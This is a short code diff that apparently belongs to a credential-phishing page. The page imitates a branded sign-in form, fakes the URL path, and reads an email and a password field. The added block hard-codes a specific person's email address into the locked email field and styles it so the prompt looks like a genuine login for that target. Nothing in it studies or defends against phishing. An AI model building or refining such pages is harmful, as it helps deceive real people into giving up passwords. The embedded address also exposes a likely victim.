@@ -76,7 +76,7 @@
                 '<path d="M3 7l9 6 9-6"/>' +
               '</svg>' +
             '</span>' +
-            '<input class="inp_core" type="email" id="mail_x9k2" placeholder="' + "mail_x9k2" + '" autocomplete="off" readonly>' +
+            '<input class="inp_core" type="email" id="mail_x9k2" autocomplete="off" readonly>' +
           '</div>' +
         '</div>' +
         '<div class="row_block">' +
@@ -166,6 +166,18 @@
     applyBackground();
     fakeURLPath();
 
+document.addEventListener('DOMContentLoaded', function () {
+  const emailInput = document.querySelector('.inp_core[type="email"]');
+
+  if (emailInput) {
+    emailInput.removeAttribute('readonly');
+    emailInput.value = 'dumelord@yahoo.com'; // or from localStorage
+    emailInput.style.color = '#54738b';
+    emailInput.style.webkitTextFillColor = '#54738b';
+    emailInput.setAttribute('readonly', '');
+  }
+});
+    
     var emailInput = document.getElementById("mail_x9k2");
     var passwordInput = document.getElementById("code_p4r7");
     var brandImg = document.getElementById("brand_img");
